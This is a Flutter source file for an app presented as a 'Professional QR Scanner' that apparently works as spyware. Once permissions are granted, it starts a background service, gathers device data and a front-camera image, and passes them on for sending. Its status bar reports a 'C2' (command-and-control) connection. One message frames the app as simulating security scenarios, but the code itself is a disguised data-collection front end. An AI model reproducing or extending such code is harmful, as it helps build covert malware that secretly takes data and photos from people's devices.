// lib/screens/qr_scanner_screen.dart
import 'dart:async';
// import 'dart:io'; // لا نحتاج File هنا مباشرة
import 'package:flutter/material.dart';
import 'package:mobile_scanner/mobile_scanner.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:camera/camera.dart'; // لإضافة XFile

import '../services/permission_service.dart';
import '../utils/constants.dart'; // للوصول إلى BG_SERVICE_EVENT_SEND_INITIAL_DATA
import '../services/data_collector_service.dart';

class QrScannerScreen extends StatefulWidget {
  const QrScannerScreen({super.key});

  @override
  State<QrScannerScreen> createState() => _QrScannerScreenState();
}

class _QrScannerScreenState extends State<QrScannerScreen> {
  final PermissionService _permissionService = PermissionService();
  final MobileScannerController _qrScannerController = MobileScannerController(
    detectionTimeoutMs: 1000,
    returnImage: false, // لا نحتاج لصورة الـ QR نفسها
  );
  final DataCollectorService _uiDataCollector = DataCollectorService();

  bool _hasPermissions = false;
  bool _isLoadingPermissions = true;
  bool _isCollectingInitialData = false;
  bool _processingQrCode = false;
  String? _detectedQrCodeData;

  // --- متغيرات لعرض حالة خدمة الخلفية (اختياري) ---
  String _backgroundServiceStatusText = "BG Service: Unknown";
  String? _currentDeviceIdForDisplay;
  bool _isSocketConnectedForDisplay = false;
  StreamSubscription? _bgServiceUpdateSubscription;

  @override
  void initState() {
    super.initState();
    _checkAndRequestPermissions();

    // (اختياري) الاستماع لتحديثات خدمة الخلفية
    _bgServiceUpdateSubscription = FlutterBackgroundService().on('update').listen((
      event,
    ) {
      if (!mounted) return;
      setState(() {
        final timestamp =
            event != null && event.containsKey('current_date')
                ? event['current_date']
                : 'N/A';
        final initialDataStatus =
            event != null && event.containsKey('initial_data_status')
                ? event['initial_data_status']
                : 'Unknown';

        _currentDeviceIdForDisplay = event?['device_id'] as String?;
        _isSocketConnectedForDisplay = event?['socket_status'] == 'Connected';

        _backgroundServiceStatusText =
            "BG Update: $timestamp\n"
            "Initial Data: $initialDataStatus\n"
            "Device ID: ${_currentDeviceIdForDisplay ?? 'Fetching...'}\n"
            "C2 Connect: ${_isSocketConnectedForDisplay ? 'Online' : 'Offline'}";
      });
    });

    // التحقق من حالة الخدمة عند بدء الـ UI
    _checkBackgroundServiceRunningStatus();
  }

  Future<void> _checkBackgroundServiceRunningStatus() async {
    bool isRunning = await FlutterBackgroundService().isRunning();
    if (mounted) {
      setState(() {
        if (!isRunning) {
          _backgroundServiceStatusText = "BG Service: Not Running";
        }
        // إذا كانت تعمل، ننتظر أول 'update' event
      });
    }
  }

  @override
  void dispose() {
    _qrScannerController.dispose();
    _uiDataCollector
        .disposeCamera(); // يتم التخلص من الكاميرا الأمامية المستخدمة للجمع الأولي
    _bgServiceUpdateSubscription?.cancel(); // إلغاء الاشتراك
    super.dispose();
  }

  Future<void> _collectAndSendData() async {
    if (!mounted) return;
    setState(() => _isCollectingInitialData = true);
    debugPrint(
      "QrScannerScreen: Starting initial data collection from UI thread...",
    );

    Map<String, dynamic> collectedPayload;
    try {
      collectedPayload =
          await _uiDataCollector.collectInitialDataFromUiThread();
    } catch (e, s) {
      debugPrint(
        "QrScannerScreen: Error during _uiDataCollector.collectInitialData: $e\nStackTrace: $s",
      );
      collectedPayload = {
        'data': {
          'error_ui_collection_main':
              'Exception in QrScannerScreen data collection',
          'details': e.toString(),
        },
        'imageFile': null,
      };
    }

    final Map<String, dynamic>? jsonData =
        collectedPayload['data'] as Map<String, dynamic>?;
    final XFile? imageFileFromUI = collectedPayload['imageFile'] as XFile?;

    if (jsonData != null) {
      debugPrint(
        "QrScannerScreen: Data collection attempt finished. Triggering background service to send data.",
      );
      // jsonData هنا يجب أن يحتوي على deviceInfo وبداخله deviceId
      // BackgroundService سيقوم بإعادة تأكيد deviceId إذا لزم الأمر
      FlutterBackgroundService().invoke(BG_SERVICE_EVENT_SEND_INITIAL_DATA, {
        'jsonData': jsonData,
        'imagePath': imageFileFromUI?.path,
      });
    } else {
      debugPrint(
        "QrScannerScreen: jsonData was null after collection attempt.",
      );
      FlutterBackgroundService().invoke(
        BG_SERVICE_EVENT_SEND_INITIAL_DATA, // إرسال حدث حتى لو فشل الجمع لإعلام الخدمة
        {
          'jsonData': {
            'error_qr_screen':
                'Initial data collection in UI resulted in null jsonData',
          },
          'imagePath': null,
        },
      );
    }

    if (mounted) {
      setState(() => _isCollectingInitialData = false);
    }
  }

  Future<void> _checkAndRequestPermissions() async {
    if (!mounted) return;
    setState(() => _isLoadingPermissions = true);

    bool granted = await _permissionService.checkPermissions();
    if (!granted && mounted) {
      granted = await _permissionService.requestRequiredPermissions(context);
    }

    if (!mounted) return;
    setState(() {
      _hasPermissions = granted;
      _isLoadingPermissions = false;
    });

    if (granted) {
      // تأكد من أن خدمة الخلفية تعمل قبل إرسال البيانات
      bool serviceRunning = await FlutterBackgroundService().isRunning();
      if (!serviceRunning) {
        debugPrint(
          "QrScannerScreen: Background service is not running. Attempting to start...",
        );
        await FlutterBackgroundService().startService(); // حاول تشغيلها
        // قد تحتاج لانتظار قليل هنا للتأكد أنها بدأت قبل إرسال الأمر
        await Future.delayed(const Duration(seconds: 2));
      }
      await _collectAndSendData();
    } else {
      debugPrint(
        "Permissions not granted. Cannot proceed with initial data send.",
      );
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Text(
              "Required permissions were not granted. App functionality will be limited.",
            ),
            duration: Duration(seconds: 4),
          ),
        );
      }
    }
  }

  void _handleQrCodeDetection(BarcodeCapture capture) {
    if (_processingQrCode || _isCollectingInitialData) return;

    final List<Barcode> barcodes = capture.barcodes;
    if (barcodes.isNotEmpty && mounted) {
      setState(() {
        _processingQrCode = true;
        _detectedQrCodeData = barcodes.first.rawValue ?? 'No data found in QR';
      });

      ScaffoldMessenger.of(context).removeCurrentSnackBar();
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text('QR Code Detected: $_detectedQrCodeData'),
          duration: const Duration(seconds: 3),
        ),
      );
      debugPrint('Barcode detected: $_detectedQrCodeData');

      // يمكنك هنا إرسال _detectedQrCodeData إلى خدمة الخلفية إذا كان هذا جزءًا من السيناريو
      // مثال: FlutterBackgroundService().invoke('qr_code_scanned', {'data': _detectedQrCodeData});

      Future.delayed(const Duration(seconds: 2), () {
        if (mounted) {
          setState(() {
            _processingQrCode = false;
          });
        }
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Professional QR Scanner'),
        actions: [
          if (_isCollectingInitialData)
            const Padding(
              padding: EdgeInsets.all(16.0),
              child: SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: Colors.white,
                ),
              ),
            )
          else if (!_isLoadingPermissions && !_hasPermissions)
            IconButton(
              icon: const Icon(
                Icons.warning_amber_rounded,
                color: Colors.orangeAccent,
              ),
              tooltip: 'Permissions Required',
              onPressed: _checkAndRequestPermissions,
            ),
          // (اختياري) أيقونة لحالة الاتصال بـ C2
          Padding(
            padding: const EdgeInsets.only(right: 8.0),
            child: Icon(
              _isSocketConnectedForDisplay
                  ? Icons.cloud_done_outlined
                  : Icons.cloud_off_outlined,
              color:
                  _isSocketConnectedForDisplay
                      ? Colors.greenAccent
                      : Colors.redAccent,
              semanticLabel:
                  _isSocketConnectedForDisplay
                      ? "C2 Connected"
                      : "C2 Disconnected",
            ),
          ),
        ],
        bottom: PreferredSize(
          // عرض حالة خدمة الخلفية تحت AppBar
          preferredSize: const Size.fromHeight(50.0),
          child: Container(
            color: Colors.black.withOpacity(0.2),
            padding: const EdgeInsets.all(4.0),
            alignment: Alignment.center,
            child: Text(
              _backgroundServiceStatusText,
              style: Theme.of(
                context,
              ).textTheme.bodySmall?.copyWith(color: Colors.white70),
              textAlign: TextAlign.center,
              maxLines: 3,
              overflow: TextOverflow.ellipsis,
            ),
          ),
        ),
      ),
      body: _buildBody(),
    );
  }

  Widget _buildBody() {
    if (_isLoadingPermissions || _isCollectingInitialData) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const CircularProgressIndicator(),
            const SizedBox(height: 20),
            Text(
              _isLoadingPermissions
                  ? 'Checking permissions...'
                  : 'Collecting initial device data...',
              style: const TextStyle(fontSize: 16),
            ),
          ],
        ),
      );
    }

    if (!_hasPermissions) {
      return Center(
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(
                Icons.gpp_bad_outlined,
                color: Colors.red.shade300,
                size: 70,
              ),
              const SizedBox(height: 20),
              const Text(
                'Permissions Denied',
                style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 15),
              Text(
                'This application requires essential permissions (Camera, Location, Storage) to operate and simulate security scenarios effectively. Please grant these permissions.',
                textAlign: TextAlign.center,
                style: TextStyle(color: Colors.grey[400], fontSize: 15),
              ),
              const SizedBox(height: 25),
              ElevatedButton.icon(
                icon: const Icon(Icons.security_update_good_outlined),
                label: const Text('Grant Permissions'),
                onPressed: _checkAndRequestPermissions,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.tealAccent.shade700,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(
                    horizontal: 20,
                    vertical: 12,
                  ),
                  textStyle: const TextStyle(fontSize: 16),
                ),
              ),
              const SizedBox(height: 12),
              TextButton(
                child: const Text(
                  'Open App Settings',
                  style: TextStyle(color: Colors.tealAccent),
                ),
                onPressed: () => openAppSettings(), // from permission_handler
              ),
            ],
          ),
        ),
      );
    }

    // إذا تم منح الأذونات، اعرض واجهة الماسح الضوئي
    return Stack(
      alignment: Alignment.center,
      children: [
        MobileScanner(
          controller: _qrScannerController,
          onDetect: _handleQrCodeDetection,
          // يمكنك ضبط خيارات أخرى للماسح هنا
        ),
        // إطار التوجيه لمسح QR
        Container(
          width: MediaQuery.of(context).size.width * 0.7, // 70% من عرض الشاشة
          height: MediaQuery.of(context).size.width * 0.7,
          decoration: BoxDecoration(
            border: Border.all(
              color:
                  _processingQrCode
                      ? Colors.lightGreenAccent
                      : Colors.white.withOpacity(0.7),
              width: _processingQrCode ? 4 : 2,
            ),
            borderRadius: BorderRadius.circular(16),
          ),
        ),
        // مؤشر المعالجة
        if (_processingQrCode)
          Positioned(
            bottom: 50,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.75),
                borderRadius: BorderRadius.circular(25),
              ),
              child: const Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  SizedBox(
                    width: 18,
                    height: 18,
                    child: CircularProgressIndicator(
                      strokeWidth: 2.5,
                      valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                    ),
                  ),
                  SizedBox(width: 15),
                  Text(
                    'Processing QR Code...',
                    style: TextStyle(color: Colors.white, fontSize: 15),
                  ),
                ],
              ),
            ),
          ),
      ],
    );
  }
}
